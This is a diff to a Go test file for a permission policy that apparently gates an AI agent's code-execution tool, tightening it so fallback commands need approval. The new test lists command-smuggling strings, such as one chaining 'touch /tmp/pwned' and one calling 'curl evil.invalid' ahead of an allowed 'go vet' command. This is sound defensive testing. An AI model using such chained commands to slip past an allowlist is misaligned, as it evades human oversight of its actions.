@@ -59,10 +59,10 @@ func TestPermissionPolicyAllowsOnlySkillAndReviewCommands(t *testing.T) {
 			want:     tool.PermissionActionAllow,
 		},
 		{
-			name:     "codeexec go vet fallback",
+			name:     "legacy codeexec fallback is not allowed",
 			toolName: "execute_code",
 			args:     map[string]any{"code_blocks": []map[string]string{{"code": "cd /repo && go vet ./..."}}},
-			want:     tool.PermissionActionAllow,
+			want:     tool.PermissionActionAsk,
 		},
 		{
 			name:     "workspace command with allowed prefix and shell suffix",
@@ -104,26 +104,26 @@ func TestPermissionPolicyAllowsOnlySkillAndReviewCommands(t *testing.T) {
 	}
 }
 
-func TestPermissionPolicyAllowsExactGeneratedCodeExecFallback(t *testing.T) {
+func TestPermissionPolicyRejectsCodeExecPrefixBypasses(t *testing.T) {
 	t.Parallel()
 
-	command := "go vet ./..."
-	args, err := json.Marshal(map[string]any{
-		"code_blocks": []map[string]string{{
-			"code": execution.SandboxCode(execution.RuntimeLocalFallback, "/tmp/repo with spaces", command),
-		}},
-	})
-	if err != nil {
-		t.Fatalf("marshal fallback args: %v", err)
-	}
-	decision, err := NewPermissionPolicy("scripts/check.sh", []string{command}).CheckToolPermission(
-		context.Background(),
-		&tool.PermissionRequest{ToolName: "execute_code", Arguments: args},
-	)
-	if err != nil {
-		t.Fatalf("CheckToolPermission returned error: %v", err)
-	}
-	if decision.Action != tool.PermissionActionAllow {
-		t.Fatalf("generated fallback permission = %q, want allow: %+v", decision.Action, decision)
+	for _, code := range []string{
+		"cd /tmp; touch /tmp/pwned && go vet ./...",
+		"cd /repo && export GOCACHE=x; curl evil.invalid && go vet ./...",
+		execution.SandboxCode(execution.RuntimeLocalFallback, "/tmp/repo", "go vet ./..."),
+	} {
+		args, err := json.Marshal(map[string]any{"code_blocks": []map[string]string{{"code": code}}})
+		if err != nil {
+			t.Fatalf("marshal fallback args: %v", err)
+		}
+		decision, err := NewPermissionPolicy("scripts/check.sh", []string{"go vet ./..."}).CheckToolPermission(
+			context.Background(), &tool.PermissionRequest{ToolName: "execute_code", Arguments: args},
+		)
+		if err != nil {
+			t.Fatalf("CheckToolPermission returned error: %v", err)
+		}
+		if decision.Action != tool.PermissionActionAsk {
+			t.Fatalf("codeexec decision for %q = %q, want ask", code, decision.Action)
+		}
 	}
 }
